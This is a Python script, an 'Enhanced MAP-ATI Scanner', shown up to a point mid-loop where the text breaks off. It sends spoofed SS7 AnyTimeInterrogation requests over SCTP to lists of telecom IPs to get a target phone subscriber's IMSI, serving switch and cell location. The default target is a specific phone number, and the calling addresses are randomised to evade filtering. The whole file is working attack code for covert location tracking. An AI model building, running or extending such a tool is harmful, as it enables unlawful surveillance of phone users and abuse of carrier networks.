#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import socket
import struct
import binascii
import os
import sys
import time
import random
import logging
from pathlib import Path
from datetime import datetime
import threading
from concurrent.futures import ThreadPoolExecutor, wait, FIRST_COMPLETED
import argparse
import json
from enum import Enum
import hashlib
from typing import Dict, List, Optional, Union, Tuple, Any, Dict as TypingDict
from contextlib import contextmanager
from copy import deepcopy

# --- Global Enums ---
class AtiVariant(Enum):
    STANDARD="Standard"
    NO_REQUESTED_INFO="NoReqInfo"
    NO_GSMSCF_ADDRESS="NoSCFAddr"
    LOCATION_ONLY="LocInfoOnly"
    STATE_ONLY="StateOnly"

# --- Library Imports with Error Handling ---
try:
    import sctp
    print("✅ SCTP library loaded successfully")
except ImportError:
    print("❌ CRITICAL Error: 'sctp' (python-sctp) library not found. Install it with 'pip install pysctp'.")
    sys.exit(1)

try:
    from rich.console import Console
    from rich.text import Text
    from rich.panel import Panel
    from rich.progress import Progress, BarColumn, TextColumn, TimeRemainingColumn, SpinnerColumn
    from rich.logging import RichHandler
    console = Console()
    print("✅ Rich library loaded successfully")
except ImportError:
    print("⚠️  Warning: 'rich' library not found. Install with 'pip install rich'. Using basic printing.")
    class DummyConsole:
        def print(self, *args, **kwargs): print(*args)
    console = DummyConsole()

try:
    import hexdump
    print("✅ Hexdump library loaded successfully")
except ImportError:
    hexdump = None 
    print("⚠️  Warning: hexdump library not found. Hex output will be basic.")

# --- Pycrate Initialization ---
PYCRATE_AVAILABLE = False
print("🔧 Initializing Pycrate components...")

try:
    # Core ASN.1 Runtime
    from pycrate_asn1rt.err import ASN1Err, ASN1ObjErr
    from pycrate_asn1rt.asnobj_ext import EXT, OPEN
    from pycrate_asn1rt.asnobj_basic import OID, INT, NULL, ASN1Obj
    from pycrate_asn1rt.asnobj_str import OCT_STR
    from pycrate_asn1rt.asnobj_construct import SEQ, CHOICE
    from pycrate_asn1rt.dictobj import ASN1Dict
    from pycrate_asn1rt.glob import GLOBAL
    from pycrate_asn1rt.utils import (
        MODE_TYPE, MODE_VALUE, MODE_SET,
        TAG_UNIVERSAL, TAG_APPLICATION, TAG_CONTEXT_SPEC, TAG_PRIVATE,
        TAG_IMPLICIT, TAG_EXPLICIT
    )
    from pycrate_asn1rt.refobj import ASN1RefType
    from pycrate_asn1rt.codecs import ASN1CodecBER
    print("✅ Pycrate ASN.1 runtime loaded")
    
    # Mobile protocol modules
    from pycrate_mobile import SCCP
    from pycrate_mobile import TS29002_MAPIE as MAP_IE
    from pycrate_mobile import TS29002_MAPAppCtx as MAP_AC
    print("✅ Pycrate mobile protocols loaded")
    
    # MAP Data Types
    MAP_defs = None
    try:
        from pycrate_mobile import MAP as MAP_module
        MAP_defs = MAP_module
        print("✅ MAP data types loaded from pycrate_mobile.MAP")
    except ImportError:
        try:
            from pycrate_asn1dir import TCAP_MAPv2v3 as MAP_fallback
            if hasattr(MAP_fallback, 'MAP_MS_DataTypes'):
                MAP_defs = MAP_fallback
                print("✅ MAP data types loaded from TCAP_MAPv2v3")
            else:
                raise ImportError("MAP_MS_DataTypes not found")
        except ImportError:
            print("❌ Failed to load MAP data types")
            sys.exit(1)
    
    # TCAP Definitions
    TCAP_defs = None
    try:
        from pycrate_asn1dir import TCAP2
        if hasattr(TCAP2, 'TCAPMessages'):
            TCAP_defs = TCAP2.TCAPMessages
            print("✅ TCAP definitions loaded from TCAP2")
        else:
            raise ImportError("TCAPMessages not found in TCAP2")
    except ImportError as e:
        print(f"❌ Failed to load TCAP2: {e}")
        sys.exit(1)
    
    PYCRATE_AVAILABLE = True
    print("✅ All Pycrate components loaded successfully")
    
except ImportError as e:
    print(f"❌ Pycrate import failed: {e}")
    sys.exit(1)
except Exception as e:
    print(f"❌ Pycrate initialization error: {e}")
    sys.exit(1)

# --- Global Constants ---
MAP_OP_ANY_TIME_INTERROGATION = 71
DEFAULT_TARGET_MSISDN = "212681364829"
DEFAULT_IPS_FILE = "ips.txt"
DEFAULT_RESULTS_DIR = "results_enhanced"
DEFAULT_MAX_WORKERS = 30
DEFAULT_SCTP_TIMEOUT = 5
DEFAULT_SCTP_PPID = 0
DEFAULT_SCTP_PORTS = [2905, 2906]

# SCCP Parameters
DEFAULT_CDPA_SSN = 149
DEFAULT_CDPA_TT = 0
DEFAULT_CDPA_NP = 1
DEFAULT_CDPA_NAI = 4
DEFAULT_CDPA_ES = 1
DEFAULT_CGPA_SSN_POOL = [8, 146, 147, 148]
DEFAULT_CGPA_GT_DIGITS = "212600000000"
DEFAULT_SCCP_PROTO_CLASS_POOL = [0, 1]

# TCAP Tags
TCAP_TAG_DTID = 0x48
TCAP_TAG_COMPONENT_PORTION = 0x6C
TCAP_MSG_END_TAG = 0x65
TCAP_MSG_CONTINUE_TAG = 0x64
TCAP_COMP_RETURN_RESULT_LAST_TAG = 0xA2
TCAP_COMP_RETURN_ERROR_TAG = 0xA3
TCAP_COMP_REJECT_TAG = 0xA4

# Locks
main_csv_lock = threading.Lock()
per_ip_file_locks = {}
per_ip_file_locks_lock = threading.Lock()
pdu_build_lock = threading.Lock()

# Logger
logger = logging.getLogger("enhanced_scanner")

# --- Utility Functions ---
def build_ber_length(length_int: int) -> bytes:
    """Build BER length encoding"""
    if not isinstance(length_int, int):
        raise ValueError("Integer expected for BER length")
    if length_int < 0:
        raise ValueError("Non-negative integer expected")
    
    if length_int < 0x80:
        return bytes([length_int])
    
    # Long form
    length_bytes = bytearray()
    temp_length = length_int
    
    while temp_length > 0:
        length_bytes.insert(0, temp_length & 0xFF)
        temp_length >>= 8
    
    if not length_bytes:
        length_bytes.append(0)
    
    if len(length_bytes) > 126:
        raise ValueError(f"Length {length_int} too large for BER encoding")
    
    return bytes([0x80 | len(length_bytes)]) + length_bytes

def find_tlv(data_bytes: bytes, target_tag: int) -> Tuple[Optional[bytes], Optional[int], Optional[bytes]]:
    """Find TLV in BER data"""
    if not data_bytes:
        return None, None, None
    
    idx = 0
    while idx < len(data_bytes):
        try:
            if idx >= len(data_bytes):
                break
            
            tag = data_bytes[idx]
            tag_start = idx
            idx += 1
            
            if idx >= len(data_bytes):
                break
            
            length_byte = data_bytes[idx]
            idx += 1
            
            if length_byte & 0x80 == 0:
                # Short form
                value_length = length_byte
            else:
                # Long form
                num_octets = length_byte & 0x7F
                if num_octets == 0 or num_octets > 4:
                    break
                
                if idx + num_octets > len(data_bytes):
                    break
                
                value_length = int.from_bytes(data_bytes[idx:idx + num_octets], 'big')
                idx += num_octets
            
            value_start = idx
            if value_start + value_length > len(data_bytes):
                break
            
            value_bytes = data_bytes[value_start:value_start + value_length]
            full_tlv = data_bytes[tag_start:value_start + value_length]
            
            if tag == target_tag:
                return value_bytes, tag, full_tlv
            
            idx = value_start + value_length
            
        except (IndexError, ValueError):
            break
    
    return None, None, None

def format_msisdn_for_map(msisdn: str, nai_byte_value: int = 0x91) -> bytes:
    """Format MSISDN for MAP encoding"""
    if not msisdn or not msisdn.strip():
        raise ValueError("MSISDN cannot be empty")
    
    # Extract digits only
    digits = "".join(filter(str.isdigit, msisdn.strip()))
    
    if not digits:
        raise ValueError("MSISDN must contain at least one digit")
    
    # Apply BCD encoding with nibble swapping
    if len(digits) % 2:
        digits += "F"
    
    bcd_bytes = bytearray()
    for i in range(0, len(digits), 2):
        byte_str = digits[i:i+2]
        # Swap nibbles: second digit in high nibble, first in low nibble
        bcd_bytes.append(int(byte_str[1] + byte_str[0], 16))
    
    return bytes([nai_byte_value]) + bcd_bytes

def generate_dynamic_cgpa_gt(base: str, seed: str, min_length: int = 11, max_length: int = 14) -> str:
    """Generate dynamic CgPA GT"""
    try:
        base_digits = "".join(filter(str.isdigit, str(base)))
        seed_hash = hashlib.md5(f"{seed}{time.time()}".encode()).hexdigest()[:random.randint(2, 6)]
        seed_part = "".join(str(int(c, 16) % 10) for c in seed_hash)
        
        combined = base_digits + seed_part
        target_length = random.randint(min_length, max_length)
        
        if len(combined) >= target_length:
            return combined[:target_length]
        else:
            padding = "".join(random.choice("0123456789") for _ in range(target_length - len(combined)))
            return combined + padding
            
    except Exception:
        # Fallback to pure random
        return "".join(random.choice("0123456789") for _ in range(random.randint(min_length, max_length)))

def get_per_ip_file_lock(lock_key: str) -> threading.Lock:
    """Get or create per-IP lock"""
    global per_ip_file_locks, per_ip_file_locks_lock
    with per_ip_file_locks_lock:
        if lock_key not in per_ip_file_locks:
            per_ip_file_locks[lock_key] = threading.Lock()
        return per_ip_file_locks[lock_key]

# --- SCCP Address Builder - CORRECTED METHOD ---
def build_sccp_address_using_methods(ssn: int, gt: str, tt: int, np: int, nai: int, es: int) -> SCCP._SCCPAddr:
    """Build SCCP address using proper Pycrate methods - CORRECTED APPROACH"""
    
    # Create SCCP address instance
    addr = SCCP._SCCPAddr()
    
    # Set Address Indicator
    addr['AddrInd']['res'].set_val(0)
    addr['AddrInd']['RoutingInd'].set_val(1)  # route on SSN
    addr['AddrInd']['GTInd'].set_val(4)       # GT format 4
    addr['AddrInd']['SSNInd'].set_val(1)      # SSN present
    addr['AddrInd']['PCInd'].set_val(0)       # PC not present
    
    # Set SSN
    addr['SSN'].set_val(ssn)
    
    # Build GT_4 structure step by step
    gt4 = addr['GT'].get_alt()  # This should give us the GT_4 alternative
    
    # Set GT_4 fields individually
    gt4['TranslationType'].set_val(tt)
    gt4['NumberingPlan'].set_val(np)
    gt4['EncodingScheme'].set_val(es)
    gt4['spare'].set_val(0)
    gt4['NAI'].set_val(nai)
    
    # Set address using the BCD encoding method
    gt4.set_addr_bcd(gt)
    
    return addr

# --- PDU Builder ---
def build_ati_pdu(otid_bytes: bytes, ati_variant: AtiVariant, target_msisdn: str, 
                  cgpa_gt: str, args: argparse.Namespace, unique_id: str) -> Optional[bytes]:
    """Build ATI PDU using Pycrate"""
    
    with pdu_build_lock:
        logger.debug(f"[{unique_id}] Building ATI PDU with variant: {ati_variant.value}")
        
        if not PYCRATE_AVAILABLE:
            logger.error(f"[{unique_id}] Pycrate not available")
            return None
        
        try:
            # 1. Build MAP ATI Arguments
            ati_args = {}
            
            # Subscriber Identity (MSISDN)
            nai_val = (0x80 | args.cdpa_nai) if args.cdpa_nai <= 15 else args.cdpa_nai
            msisdn_bytes = format_msisdn_for_map(target_msisdn, nai_val)
            ati_args['subscriberIdentity'] = ('msisdn', msisdn_bytes)
            
            # Requested Info
            if ati_variant != AtiVariant.NO_REQUESTED_INFO:
                req_info = {}
                if ati_variant in [AtiVariant.STANDARD, AtiVariant.LOCATION_ONLY]:
                    req_info['locationInformation'] = 0
                if ati_variant in [AtiVariant.STANDARD, AtiVariant.STATE_ONLY]:
                    req_info['subscriberState'] = 0
                ati_args['requestedInfo'] = req_info
            
            # GSM-SCF Address
            if ati_variant != AtiVariant.NO_GSMSCF_ADDRESS and cgpa_gt:
                nai_scf = (0x80 | args.cgpa_nai) if args.cgpa_nai <= 15 else args.cgpa_nai
                scf_bytes = format_msisdn_for_map(cgpa_gt, nai_scf)
                ati_args['gsmSCF-Address'] = scf_bytes
            
            # 2. Get MAP ATI Argument Type and encode
            MAP_MS_DataTypes = getattr(MAP_defs, 'MAP_MS_DataTypes', MAP_defs)
            AnyTimeInterrogationArgType = getattr(MAP_MS_DataTypes, 'AnyTimeInterrogationArg', None)
            
            if not AnyTimeInterrogationArgType:
                logger.error(f"[{unique_id}] AnyTimeInterrogationArg type not found")
                return None
            
            # Create and encode MAP parameter
            ati_param_instance = deepcopy(AnyTimeInterrogationArgType)
            ati_param_instance.set_val(ati_args)
            parameter_ber_bytes = ati_param_instance.to_ber()
            
            # 3. Build Invoke
            invoke_id = random.randint(1, 127)
            invoke_pdu = deepcopy(TCAP_defs.Invoke)
            
            # Set basic invoke structure
            invoke_values = {
                'invokeID': invoke_id,
                'opCode': ('localValue', MAP_OP_ANY_TIME_INTERROGATION)
            }
            invoke_pdu.set_val(invoke_values)
            
            # Handle parameter field (ANY type) - CORRECTED METHOD
            try:
                # Method 1: Use from_ber for ANY type
                invoke_pdu._cont['parameter'].from_ber(parameter_ber_bytes)
                logger.debug(f"[{unique_id}] Parameter set using from_ber method")
            except Exception as e_param:
                logger.debug(f"[{unique_id}] from_ber failed, trying alternative: {e_param}")
                try:
                    # Method 2: Direct value assignment
                    invoke_pdu._cont['parameter']._val = parameter_ber_bytes
                    logger.debug(f"[{unique_id}] Parameter set using direct _val assignment")
                except Exception as e_param2:
                    logger.error(f"[{unique_id}] All parameter methods failed: {e_param2}")
                    return None
            
            # 4. Build Component
            component_obj = deepcopy(TCAP_defs.Component)
            component_obj.set_val(('invoke', invoke_pdu.get_val()))
            
            # 5. Build Component Portion
            cp_obj = deepcopy(TCAP_defs.ComponentPortion)
            cp_obj.set_val([component_obj.get_val()])
            
            # 6. Build Dialogue Portion
            dialogue_portion = None
            try:
                acn_oid = '0.4.0.0.1.0.19.3'  # Standard ATI v3 context
                dialogue_acn_value = tuple(map(int, acn_oid.split('.')))
                
                # Build DialoguePDU
                dialogue_pdu = deepcopy(TCAP_defs.DialoguePDU)
                dialogue_pdu.set_val(('dialogueRequest', {'application-context-name': dialogue_acn_value}))
                
                # Build ExternalPDU
                external_pdu = deepcopy(TCAP_defs.ExternalPDU)
                dialogue_as_oid = (0, 0, 17, 773, 1, 1, 1)
                
                external_pdu.set_val({
                    'oid': dialogue_as_oid,
                    'dialog': dialogue_pdu.get_val()
                })
                
                dialogue_portion = external_pdu.get_val()
            except Exception as e:
                logger.warning(f"[{unique_id}] Error building dialogue portion: {e}")
            
            # 7. Build Begin PDU
            begin_pdu = deepcopy(TCAP_defs.Begin)
            begin_values = {'otid': otid_bytes}
            
            if dialogue_portion:
                begin_values['dialoguePortion'] = dialogue_portion
            if cp_obj.get_val():
                begin_values['components'] = cp_obj.get_val()
            
            begin_pdu.set_val(begin_values)
            
            # 8. Build TC Message
            tcap_message = deepcopy(TCAP_defs.TCMessage)
            tcap_message.set_val(('begin', begin_pdu.get_val()))
            
            # 9. Encode TCAP
            tcap_bytes = tcap_message.to_ber()
            logger.info(f"[{unique_id}] TCAP PDU built successfully ({len(tcap_bytes)} bytes)")
            
            # 10. Build SCCP wrapper - CORRECTED APPROACH USING METHODS
            
            # Called Party Address (HLR)
            cdpa_addr = build_sccp_address_using_methods(
                args.cdpa_ssn, target_msisdn, args.cdpa_tt, 
                args.cdpa_np, args.cdpa_nai, args.cdpa_es
            )
            
            # Calling Party Address (GMLC/SGSN)
            cgpa_addr = build_sccp_address_using_methods(
                args.used_cgpa_ssn, cgpa_gt, args.cgpa_tt,
                args.cgpa_np, args.cgpa_nai, args.cgpa_es
            )
            
            # Build SCCP UDT
            sccp_udt = SCCP.SCCPUnitData()
            sccp_values = {
                'Type': 9,  # UDT
                'ProtocolClass': {'Handling': 0, 'Class': args.used_sccp_pc & 0x0F},
                'Pointers': {
                    'Ptr0': 0,  # Will be set automatically
                    'Ptr1': 0,  # Will be set automatically  
                    'Ptr2': 0   # Will be set automatically
                },
                'CalledPartyAddr': {'Len': 0, 'Value': cdpa_addr.get_val()},
                'CallingPartyAddr': {'Len': 0, 'Value': cgpa_addr.get_val()},
                'Data': {'Len': len(tcap_bytes), 'Value': tcap_bytes}
            }
            sccp_udt.set_val(sccp_values)
            
            sccp_bytes = sccp_udt.to_bytes()
            logger.info(f"[{unique_id}] SCCP UDT built successfully ({len(sccp_bytes)} bytes)")
            
            return sccp_bytes
            
        except Exception as e:
            logger.error(f"[{unique_id}] PDU build error: {e}", exc_info=True)
            return None

# --- Response Parser ---
def parse_response(raw_response: bytes, unique_id: str) -> Dict[str, Any]:
    """Parse SCCP/TCAP response"""
    result = {
        'success': False,
        'tcap_outcome': 'ParseError',
        'error_info': 'Unknown parsing error',
        'imsi': 'N/A',
        'vlr_name': 'N/A',
        'msc_name': 'N/A',
        'mcc': 'N/A',
        'mnc': 'N/A',
        'lac': 'N/A',
        'cell_id': 'N/A',
        'cgi_found': False,
        'subscriber_state': 'N/A'
    }
    
    if not raw_response or len(raw_response) < 5:
        result['error_info'] = f"Response too short: {len(raw_response)} bytes"
        return result
    
    try:
        # Parse SCCP layer
        if raw_response[0] != 0x09:  # UDT
            result['error_info'] = f"Unexpected SCCP message type: 0x{raw_response[0]:02X}"
            return result
        
        # Extract TCAP payload
        ptr_data = raw_response[4]
        param_start = 5 + ptr_data - 1
        
        if param_start + 1 >= len(raw_response) or raw_response[param_start] != 0x03:
            result['error_info'] = "Invalid SCCP data parameter"
            return result
        
        data_length = raw_response[param_start + 1]
        tcap_start = param_start + 2
        
        if tcap_start + data_length > len(raw_response):
            result['error_info'] = "SCCP data length mismatch"
            return result
        
        tcap_payload = raw_response[tcap_start:tcap_start + data_length]
        
        # Parse TCAP layer
        if len(tcap_payload) < 2:
            result['error_info'] = "TCAP payload too short"
            return result
        
        tcap_type = tcap_payload[0]
        
        if tcap_type in [TCAP_MSG_END_TAG, TCAP_MSG_CONTINUE_TAG]:
            # Find component portion
            comp_portion, _, _ = find_tlv(tcap_payload[2:], TCAP_TAG_COMPONENT_PORTION)
            
            if comp_portion:
                # Parse components
                offset = 0
                while offset < len(comp_portion):
                    if offset >= len(comp_portion):
                        break
                    
                    comp_tag = comp_portion[offset]
                    if comp_tag == TCAP_COMP_RETURN_RESULT_LAST_TAG:
                        result['tcap_outcome'] = "ReturnResultLast"
                        result['success'] = True
                        result['error_info'] = "ATI response received (basic parsing)"
                        break
                    elif comp_tag == TCAP_COMP_RETURN_ERROR_TAG:
                        result['tcap_outcome'] = "ReturnError"
                        result['error_info'] = "MAP Error received"
                        break
                    elif comp_tag == TCAP_COMP_REJECT_TAG:
                        result['tcap_outcome'] = "Reject"
                        result['error_info'] = "TCAP Reject received"
                        break
                    
                    offset += 1
            else:
                result['tcap_outcome'] = "NoComponents"
                result['error_info'] = "No component portion found"
        else:
            result['tcap_outcome'] = f"UnexpectedTCAP(0x{tcap_type:02X})"
            result['error_info'] = f"Unexpected TCAP message type: 0x{tcap_type:02X}"
        
        return result
        
    except Exception as e:
        logger.error(f"[{unique_id}] Response parsing error: {e}")
        result['error_info'] = f"Parsing exception: {e}"
        return result

# --- Main Scanner Function ---
def process_ip(ip: str, port: int, args: argparse.Namespace, otid: bytes, 
               variant: AtiVariant, attempt: int = 1) -> Dict[str, Any]:
    """Process a single IP:port target"""
    
    unique_id = f"{ip}:{port} OTID:{otid.hex()} V:{variant.value} A:{attempt}"
    start_time = time.perf_counter()
    
    logger.debug(f"[{unique_id}] Starting scan")
    
    # Initialize result
    result = {
        'ip': ip,
        'port': port,
        'timestamp': datetime.now().isoformat(),
        'sent_otid': otid.hex(),
        'ati_variant_used': variant.value,
        'attempt_number': attempt,
        'success': False,
        'tcap_outcome': 'NotStarted',
        'error_info': 'N/A',
        'duration_ms': 0,
        'timeout_phase': 'N/A',
        'imsi': 'N/A',
        'vlr_name': 'N/A',
        'msc_name': 'N/A',
        'mcc': 'N/A',
        'mnc': 'N/A',
        'lac': 'N/A',
        'cell_id': 'N/A',
        'cgi_found': False,
        'subscriber_state': 'N/A'
    }
    
    # Generate random parameters
    result['used_cgpa_ssn'] = random.choice(getattr(args, 'cgpa_ssn_pool', DEFAULT_CGPA_SSN_POOL))
    result['used_cgpa_gt'] = generate_dynamic_cgpa_gt(
        getattr(args, 'cgpa_gt_digits', DEFAULT_CGPA_GT_DIGITS),
        f"{ip}-{port}-{otid.hex()}-{attempt}"
    )
    result['used_sccp_pc'] = random.choice(getattr(args, 'sccp_proto_class_pool', DEFAULT_SCCP_PROTO_CLASS_POOL))
    
    # Update args with generated values
    args.used_cgpa_ssn = result['used_cgpa_ssn']
    args.used_cgpa_gt = result['used_cgpa_gt']
    args.used_sccp_pc = result['used_sccp_pc']
    
    sock = None
    try:
        # Build PDU
        logger.info(f"[{unique_id}] Building {variant.value} PDU")
        
        sccp_pdu = build_ati_pdu(otid, variant, args.target_msisdn, 
                                result['used_cgpa_gt'], args, unique_id)
        
        if not sccp_pdu:
            result['tcap_outcome'] = 'BuildError'
            result['error_info'] = 'PDU construction failed'
            return result
        
        result['tcap_outcome'] = 'PDU_Built'
        
        # Send and receive
        logger.info(f"[{unique_id}] Sending PDU ({len(sccp_pdu)} bytes)")
        
        # Connect
        result['timeout_phase'] = 'Connecting'
        sock = sctp.sctpsocket_tcp(socket.AF_INET)
        sock.settimeout(args.sctp_timeout)
        sock.connect((ip, port))
        
        # Send
        result['timeout_phase'] = 'Sending'
        sock.sctp_send(sccp_pdu, ppid=socket.htonl(args.sctp_ppid))
        
        # Receive
        result['timeout_phase'] = 'Receiving'
        raw_response = sock.recv(8192)
        result['timeout_phase'] = 'N/A'
        
        if not raw_response:
            result['tcap_outcome'] = 'EmptyResponse'
            result['error_info'] = 'Received empty response'
            return result
        
        logger.info(f"[{unique_id}] Received {len(raw_response)} bytes")
        
        # Parse response
        parsed_result = parse_response(raw_response, unique_id)
        result.update(parsed_result)
        
    except socket.timeout:
        result['tcap_outcome'] = 'Timeout'
        result['error_info'] = f"Timeout during {result['timeout_phase']}"
        
    except (ConnectionRefusedError, OSError) as e:
        result['tcap_outcome'] = 'ConnectionError'
        result['error_info'] = f"Connection error: {e}"
        
    except Exception as e:
        result['tcap_outcome'] = 'UnexpectedError'
        result['error_info'] = f"Unexpected error: {str(e)[:100]}"
        logger.exception(f"[{unique_id}] Unexpected error")
        
    finally:
        if sock:
            try:
                sock.close()
            except:
                pass
        
        # Calculate duration
        result['duration_ms'] = (time.perf_counter() - start_time) * 1000
    
    # Display result
    title = f"{result['ip']}:{result['port']} ({result['ati_variant_used']})"
    subtitle = f"TCAP: {result['tcap_outcome']}"
    
    # Determine panel color
    if result.get('cgi_found'):
        panel_color = "bold green"
    elif result.get('success'):
        panel_color = "bold cyan"
    elif 'Timeout' in result['tcap_outcome']:
        panel_color = "red"
    elif 'Error' in result['tcap_outcome']:
        panel_color = "red"
    else:
        panel_color = "yellow"
    
    # Build result text
    text = Text()
    
    if result.get('cgi_found'):
        text.append(f"📍 CGI: MCC:{result['mcc']}, MNC:{result['mnc']}, LAC:{result['lac']}, CI:{result['cell_id']}\n", style="green")
    
    if result.get('imsi', 'N/A') != 'N/A':
        text.append(f"📱 IMSI: {result['imsi']}\n", style="cyan")
    
    if result.get('vlr_name', 'N/A') != 'N/A':
        text.append(f"🏢 VLR: {result['vlr_name']}\n", style="cyan")
    
    if result.get('msc_name', 'N/A') != 'N/A':
        text.append(f"🏢 MSC: {result['msc_name']}\n", style="cyan")
    
    if result.get('subscriber_state', 'N/A') != 'N/A':
        text.append(f"📊 State: {result['subscriber_state']}\n")
    
    if result.get('error_info', 'N/A') != 'N/A':
        text.append(f"ℹ️  Info: {result['error_info']}\n")
    
    text.append(f"⏱️  Duration: {result['duration_ms']:.2f}ms")
    
    panel = Panel(text, title=title, subtitle=subtitle, border_style=panel_color, expand=False)
    console.print(panel)
    
    return result

# --- Main Function ---
def main():
    """Main function"""
    global logger
    
    parser = argparse.ArgumentParser(description="Enhanced MAP-ATI Scanner", 
                                   formatter_class=argparse.RawTextHelpFormatter)
    
    parser.add_argument("ips_file", nargs='?', default=DEFAULT_IPS_FILE, 
                       help="File containing target IPs")
    parser.add_argument("--target-msisdn", default=DEFAULT_TARGET_MSISDN,
                       help="Target MSISDN to interrogate")
    parser.add_argument("--sctp-ports", default=None,
                       help="SCTP ports (comma-separated or range)")
    parser.add_argument("--sctp-timeout", type=int, default=DEFAULT_SCTP_TIMEOUT,
                       help="SCTP timeout in seconds")
    parser.add_argument("--sctp-ppid", type=lambda x: int(x, 0), default=DEFAULT_SCTP_PPID,
                       help="SCTP PPID")
    parser.add_argument("--threads", type=int, default=DEFAULT_MAX_WORKERS,
                       help="Number of worker threads")
    parser.add_argument("--results-dir", default=DEFAULT_RESULTS_DIR,
                       help="Results directory")
    parser.add_argument("--ati-variant", type=AtiVariant, choices=list(AtiVariant),
                       default=AtiVariant.STANDARD, help="ATI variant to use")
    parser.add_argument("--log-level", default="INFO", choices=["DEBUG", "INFO", "WARNING", "ERROR"],
                       help="Logging level")
    parser.add_argument("--no-csv", action='store_true', help="Disable CSV output")
    
    # SCCP parameters
    parser.add_argument("--cdpa-ssn", type=int, default=DEFAULT_CDPA_SSN)
    parser.add_argument("--cdpa-tt", type=int, default=DEFAULT_CDPA_TT)
    parser.add_argument("--cdpa-np", type=int, default=DEFAULT_CDPA_NP)
    parser.add_argument("--cdpa-nai", type=int, default=DEFAULT_CDPA_NAI)
    parser.add_argument("--cdpa-es", type=int, default=DEFAULT_CDPA_ES)
    parser.add_argument("--cgpa-ssn-pool", type=str, default=None)
    parser.add_argument("--cgpa-gt-digits", default=DEFAULT_CGPA_GT_DIGITS)
    parser.add_argument("--cgpa-tt", type=int, default=DEFAULT_CDPA_TT)
    parser.add_argument("--cgpa-np", type=int, default=DEFAULT_CDPA_NP)
    parser.add_argument("--cgpa-nai", type=int, default=DEFAULT_CDPA_NAI)
    parser.add_argument("--cgpa-es", type=int, default=DEFAULT_CDPA_ES)
    parser.add_argument("--sccp-proto-class-pool", type=str, default=None)
    
    args = parser.parse_args()
    
    # Setup logging
    results_dir = Path(args.results_dir)
    results_dir.mkdir(parents=True, exist_ok=True)
    log_file = results_dir / "enhanced_scanner.log"
    
    logger.handlers.clear()
    
    # Console handler
    console_handler = RichHandler(console=console, rich_tracebacks=True, markup=True, 
                                show_path=False, log_time_format="[%X.%L]")
    console_handler.setFormatter(logging.Formatter('%(message)s'))
    console_handler.setLevel(getattr(logging, args.log_level.upper()))
    logger.addHandler(console_handler)
    
    # File handler
    file_handler = logging.FileHandler(log_file, mode='a', encoding='utf-8')
    file_handler.setFormatter(logging.Formatter(
        '%(asctime)s.%(msecs)03d-%(levelname)-8s-[%(threadName)s]-%(module)s:%(funcName)s:%(lineno)d-%(message)s',
        datefmt='%Y-%m-%d %H:%M:%S'
    ))
    file_handler.setLevel(logging.DEBUG)
    logger.addHandler(file_handler)
    logger.setLevel(logging.DEBUG)
    
    logger.info(f"Console log level: {args.log_level.upper()}. Debug log: {log_file}")
    
    # Parse pools
    if args.cgpa_ssn_pool:
        try:
            args.cgpa_ssn_pool = [int(x.strip()) for x in args.cgpa_ssn_pool.split(',') if x.strip()]
        except ValueError:
            args.cgpa_ssn_pool = DEFAULT_CGPA_SSN_POOL
    else:
        args.cgpa_ssn_pool = DEFAULT_CGPA_SSN_POOL
    
    if args.sccp_proto_class_pool:
        try:
            args.sccp_proto_class_pool = [int(x.strip()) for x in args.sccp_proto_class_pool.split(',') if x.strip()]
        except ValueError:
            args.sccp_proto_class_pool = DEFAULT_SCCP_PROTO_CLASS_POOL
    else:
        args.sccp_proto_class_pool = DEFAULT_SCCP_PROTO_CLASS_POOL
    
    # Parse ports
    if args.sctp_ports:
        ports = set()
        try:
            for part in args.sctp_ports.split(','):
                part = part.strip()
                if '-' in part:
                    start, end = map(int, part.split('-', 1))
                    ports.update(range(start, end + 1))
                else:
                    ports.add(int(part))
        except ValueError:
            ports = set(DEFAULT_SCTP_PORTS)
        target_ports = sorted(list(ports))
    else:
        target_ports = DEFAULT_SCTP_PORTS
    
    # Load IPs
    ip_file = Path(args.ips_file)
    if not ip_file.exists():
        logger.critical(f"IPs file not found: {ip_file}")
        sys.exit(1)
    
    try:
        with open(ip_file, 'r', encoding='utf-8') as f:
            ips = [line.strip().split('#')[0].strip() for line in f 
                  if line.strip() and not line.strip().startswith('#')]
    except Exception as e:
        logger.critical(f"Error reading IPs file: {e}")
        sys.exit(1)
    
    if not ips:
        logger.critical("No valid IPs found in file")
        sys.exit(1)
    
    # Display banner
    title_text = Text("Enhanced MAP-ATI Scanner", style="bold purple")
    info_text = Text(f"Target: {args.target_msisdn}\n", style="cyan")
    info_text.append(f"Threads: {args.threads}\n", style="cyan")
    info_text.append(f"Variant: {args.ati_variant.value}\n", style="cyan")
    info_text.append(f"IPs: {len(ips)}, Ports: {len(target_ports)}", style="cyan")
    
    banner_panel = Panel(info_text, title=title_text, border_style="purple", expand=False)
    console.print(banner_panel)
    
    # Create tasks
    tasks = []
    for ip in ips:
        for port in target_ports:
            tasks.append({
                'ip': ip,
                'port': port,
                'otid': os.urandom(4),
                'variant': args.ati_variant,
                'attempt': 1
            })
    
    logger.info(f"Starting scan: {len(ips)} IPs, {len(target_ports)} ports, {len(tasks)} total tasks")
    
    # CSV headers
    csv_headers = [
        "ip", "port", "timestamp", "sent_otid", "used_cgpa_gt", "used_cgpa_ssn",
        "used_sccp_pc", "ati_variant_used", "attempt_number", "tcap_outcome",
        "success", "imsi", "vlr_name", "msc_name", "mcc", "mnc", "lac", "cell_id",
        "cgi_found", "subscriber_state", "duration_ms", "error_info"
    ]
    
    # Setup master CSV
    if not args.no_csv:
        master_csv = results_dir / "master_scan_results.csv"
        with open(master_csv, 'w', newline='', encoding='utf-8') as f:
            f.write(",".join(csv_headers) + "\n")
    
    # Execute scan
    all_results = []
    stats = {'total': 0, 'success': 0, 'cgi_found': 0, 'timeouts': 0, 'errors': 0}
    
    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
        TimeRemainingColumn(),
        console=console
    ) as progress:
        
        scan_task = progress.add_task("[purple]Scanning...", total=len(tasks))
        
        with ThreadPoolExecutor(max_workers=args.threads, thread_name_prefix="Scanner") as executor:
            # Submit all tasks
            active_futures = {}
            for task_def in tasks:
                future = executor.submit(
                    process_ip,
                    task_def['ip'],
                    task_def['port'],
                    args,
                    task_def['otid'],
                    task_def['variant'],
                    task_def['attempt']
                )
                active_futures[future] = task_def
            
            # Process completed tasks
            processed_count = 0
            
            while active_futures:
                try:
                    done_futures, _ = wait(list(active_futures.keys()), return_when=FIRST_COMPLETED, timeout=1.0)
                except Exception as e:
